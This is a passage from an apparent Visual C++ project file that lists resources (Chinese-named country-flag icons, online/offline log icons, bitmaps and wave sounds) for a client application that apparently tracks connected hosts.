# Begin Source File

SOURCE=".\res\GuoQiICO\塞尔维亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\塞拉利昂.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\塞内加尔.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\塞浦路斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\塞舌尔.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\沙特阿拉伯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\上线.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\声明.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\圣多美和普林西比.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\圣基茨和尼维斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\圣卢西亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\圣马力诺.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\圣文森特和格林纳丁斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\斯里兰卡.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\斯洛伐克.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\斯洛文尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\斯威士兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\苏丹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\苏里南.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\索马里.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\所罗门群岛.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\塔吉克斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\台湾省.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\泰国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\太平洋共同体.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\坦桑尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\汤加.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\特立尼达和多巴哥.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\突尼斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\图瓦卢.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\土耳其.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\土库曼斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\退出程序.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\瓦努阿图.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\危地马拉.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\委内瑞拉.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\文莱.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\乌干达.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\乌克兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\乌拉圭.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\乌兹别克斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\无IP数据库.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\西班牙.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\西萨摩亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\希腊.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\系统设置.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\下线.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\香港.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\新加坡.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\新西兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\匈牙利.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\叙利亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\牙买加.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\亚美尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\也门.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\伊拉克.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\伊朗.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\以色列.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\意大利.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\印度.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\印度尼西亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\英格兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\英国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\约旦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\越南.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\赞比亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\乍得.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\智利.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\中非.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\中国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\重复上线.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\瑙鲁.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\梵蒂冈.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\斐济.ico"
# End Source File
# End Group
# Begin Source File

SOURCE=.\res\Wave\Dat.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\key.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\login.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\offline.wav
# End Source File
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\res\Wave\Setting.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\switch.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\welcome.wav
# End Source File
# Begin Source File

SOURCE=.\res\xpstyle.manifest
# End Source File
# End Target
# End Project
